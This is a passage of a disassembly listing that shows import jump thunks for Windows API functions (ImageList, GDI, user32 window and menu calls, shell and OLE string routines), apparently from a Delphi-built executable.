jmp [ ImageList_SetBkColor@IAT ]
ImageList_SetDragCursorImage
jmp [ ImageList_SetDragCursorImage@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_DrawEx
jmp [ ImageList_DrawEx@IAT ]
BitBlt
jmp [ BitBlt@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateCompatibleBitmap
jmp [ CreateCompatibleBitmap@IAT ]
CreateCompatibleDC
jmp [ CreateCompatibleDC@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateFontIndirectA
jmp [ CreateFontIndirectA@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
CreateSolidBrush
jmp [ CreateSolidBrush@IAT ]
DeleteDC
jmp [ DeleteDC@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
DeleteObject
jmp [ DeleteObject@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
GdiFlush
jmp [ GdiFlush@IAT ]
GetBitmapBits
jmp [ GetBitmapBits@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetDIBits
jmp [ GetDIBits@IAT ]
GetDeviceCaps
jmp [ GetDeviceCaps@IAT ]
GetEnhMetaFileBits
jmp [ GetEnhMetaFileBits@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetEnhMetaFilePaletteEntries
jmp [ GetEnhMetaFilePaletteEntries@IAT ]
GetObjectA
jmp [ GetObjectA@IAT ]
GetPaletteEntries
jmp [ GetPaletteEntries@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetStockObject
jmp [ GetStockObject@IAT ]
GetSystemPaletteEntries
jmp [ GetSystemPaletteEntries@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWinMetaFileBits
jmp [ GetWinMetaFileBits@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
IntersectClipRect
jmp [ IntersectClipRect@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PatBlt
jmp [ PatBlt@IAT ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
RealizePalette
jmp [ RealizePalette@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
RestoreDC
jmp [ RestoreDC@IAT ]
SaveDC
jmp [ SaveDC@IAT ]
SelectObject
jmp [ SelectObject@IAT ]
SelectPalette
jmp [ SelectPalette@IAT ]
SetBkColor
jmp [ SetBkColor@IAT ]
SetBkMode
jmp [ SetBkMode@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetStretchBltMode
jmp [ SetStretchBltMode@IAT ]
SetTextColor
jmp [ SetTextColor@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWinMetaFileBits
jmp [ SetWinMetaFileBits@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
StretchBlt
jmp [ StretchBlt@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ShellExecuteA
jmp [ ShellExecuteA@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeleteMenu
jmp [ DeleteMenu@IAT ]
DestroyCursor
jmp [ DestroyCursor@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawEdge
jmp [ DrawEdge@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
DrawTextA
jmp [ DrawTextA@IAT ]
EnableMenuItem
jmp [ EnableMenuItem@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FillRect
jmp [ FillRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
FrameRect
jmp [ FrameRect@IAT ]
GetActiveWindow
jmp [ GetActiveWindow@IAT ]
GetCapture
jmp [ GetCapture@IAT ]
GetClassInfoA
jmp [ GetClassInfoA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDesktopWindow
jmp [ GetDesktopWindow@IAT ]
GetFocus
jmp [ GetFocus@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyState
jmp [ GetKeyState@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetKeyboardType
jmp [ GetKeyboardType@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemCount
jmp [ GetMenuItemCount@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuState
jmp [ GetMenuState@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowLongA
jmp [ GetWindowLongA@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InflateRect
jmp [ InflateRect@IAT ]
InsertMenuA
jmp [ InsertMenuA@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IntersectRect
jmp [ IntersectRect@IAT ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsIconic
jmp [ IsIconic@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsWindowVisible
jmp [ IsWindowVisible@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadCursorA
jmp [ LoadCursorA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadKeyboardLayoutA
jmp [ LoadKeyboardLayoutA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MapWindowPoints
jmp [ MapWindowPoints@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
OffsetRect
jmp [ OffsetRect@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostMessageA
jmp [ PostMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
RegisterWindowMessageA
jmp [ RegisterWindowMessageA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
RemovePropA
jmp [ RemovePropA@IAT ]
ScreenToClient
jmp [ ScreenToClient@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SendMessageA
jmp [ SendMessageA@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetCursor
jmp [ SetCursor@IAT ]
SetFocus
jmp [ SetFocus@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenu
jmp [ SetMenu@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetPropA
jmp [ SetPropA@IAT ]
SetRect
jmp [ SetRect@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowLongA
jmp [ SetWindowLongA@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowPos
jmp [ SetWindowPos@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
SystemParametersInfoA
jmp [ SystemParametersInfoA@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
wsprintfA
jmp [ wsprintfA@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
IsEqualGUID
jmp [ IsEqualGUID@IAT ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysStringLen
jmp [ SysStringLen@IAT ]
VariantChangeTypeEx
jmp [ VariantChangeTypeEx@IAT ]
VariantClear
jmp [ VariantClear@IAT ]
VariantCopyInd
jmp [ VariantCopyInd@IAT ]
